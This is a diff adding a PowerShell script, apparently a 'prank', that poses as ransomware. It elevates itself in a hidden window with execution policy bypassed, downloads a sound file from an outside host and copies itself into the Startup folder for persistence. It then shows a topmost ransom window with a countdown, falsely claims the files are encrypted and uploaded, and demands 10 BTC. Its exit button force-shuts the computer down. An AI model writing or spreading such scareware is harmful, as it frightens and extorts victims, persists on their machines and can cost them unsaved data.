@@ -1,0 +1,96 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$currUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
+
+if (-not ([Security.Principal.WindowsPrincipal] $currUser).IsInRole($adminRole)) {
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell"
+    $psi.Arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $psi.Verb = "runas"
+    $psi.WindowStyle = "Hidden"
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    exit
+}
+if (Test-Path "C:\stophexzo.txt") { exit }
+$wavPath = "$env:USERPROFILE\Desktop\hexzo_sound.wav"
+Invoke-WebRequest -Uri 'https://files.catbox.moe/f9qen0.wav' -OutFile $wavPath -UseBasicParsing
+try {
+    $sound = New-Object System.Media.SoundPlayer $wavPath
+    $sound.Play()
+} catch {}
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$scriptPath = "$startupPath\hexzo_prank.ps1"
+if (-not (Test-Path $scriptPath)) {
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
+}
+
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$w = [int]$screen.Width
+$h = [int]$screen.Height
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "HexZo Ransom"
+$form.BackColor = 'Black'
+$form.FormBorderStyle = 'FixedDialog'
+$form.StartPosition = 'CenterScreen'
+$form.Size = New-Object System.Drawing.Size(800, 500)
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.TopMost = $true
+$title = New-Object System.Windows.Forms.Label
+$title.Text = "El God HexZo Is Here"
+$title.ForeColor = 'DarkRed'
+$title.Font = New-Object System.Drawing.Font("Consolas", 32, [System.Drawing.FontStyle]::Bold)
+$title.AutoSize = $true
+$title.Location = New-Object System.Drawing.Point(80, 40)
+$progress = New-Object System.Windows.Forms.ProgressBar
+$progress.Style = 'Marquee'
+$progress.MarqueeAnimationSpeed = 40
+$progress.Size = New-Object System.Drawing.Size(600, 25)
+$progress.Location = New-Object System.Drawing.Point(100, 130)
+$countLabel = New-Object System.Windows.Forms.Label
+$countLabel.ForeColor = 'Orange'
+$countLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
+$countLabel.AutoSize = $true
+$countLabel.Location = New-Object System.Drawing.Point(220, 170)
+$global:counter = 200
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 1000
+$timer.Add_Tick({
+    $global:counter--
+    $countLabel.Text = "ENCRYPTION BEGINS IN: $counter SECONDS"
+    if ($global:counter -le 0) {
+        $timer.Stop()
+        [System.Windows.Forms.MessageBox]::Show("Your System Is Encrypted And Uploaded To My PC")
+        $form.Close()
+    }
+})
+$timer.Start()
+$warning = New-Object System.Windows.Forms.Label
+$warning.Text = "
+To recover your files, send 10 BTC to address:
+1BoatSLRHtKNngkdXEeobR76b53LETtpyT
+"
+$warning.ForeColor = 'OrangeRed'
+$warning.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
+$warning.AutoSize = $true
+$warning.Location = New-Object System.Drawing.Point(50, 230)
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "Exit With Death"
+$button.BackColor = 'DarkRed'
+$button.ForeColor = 'White'
+$button.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
+$button.Size = New-Object System.Drawing.Size(200, 45)
+$button.Location = New-Object System.Drawing.Point(300, 320)
+
+$button.Add_Click({
+    [System.Windows.Forms.MessageBox]::Show("Your System Still Encrypted")
+    Stop-Computer -Force
+    $form.Close()
+})
+$form.Controls.Add($title)
+$form.Controls.Add($progress)
+$form.Controls.Add($countLabel)
+$form.Controls.Add($warning)
+$form.Controls.Add($button)
+$form.ShowDialog()
